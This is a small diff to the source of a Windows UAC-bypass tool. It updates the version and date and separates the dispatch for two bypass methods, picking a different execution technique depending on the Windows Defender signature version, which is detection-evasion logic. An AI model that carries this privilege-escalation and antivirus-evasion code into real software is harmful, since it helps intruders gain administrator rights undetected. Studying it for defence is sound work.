@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.01
+*  VERSION:     3.02
 *
-*  DATE:        30 Sep 2018
+*  DATE:        01 Oct 2018
 *
 *  UAC bypass dispatch.
 *
@@ -175,9 +175,16 @@ ULONG CALLBACK SetMethodExecutionType(
         switch (Method) {
 
         case UacMethodSluiHijack:
-        case UacMethodFwCplLua:
             if (SignatureVersion.Version >= WDCallbackType1MagicVer) {
                 g_ctx.MethodExecuteType = ucmExTypeRegSymlink;
+            }
+            else {
+                g_ctx.MethodExecuteType = ucmExTypeDefault;
+            }
+            break;
+        case UacMethodFwCplLua:
+            if (SignatureVersion.Version >= WDCallbackType1MagicVer) {
+                g_ctx.MethodExecuteType = ucmExTypeIndirectModification;
             }
             else {
                 g_ctx.MethodExecuteType = ucmExTypeDefault;
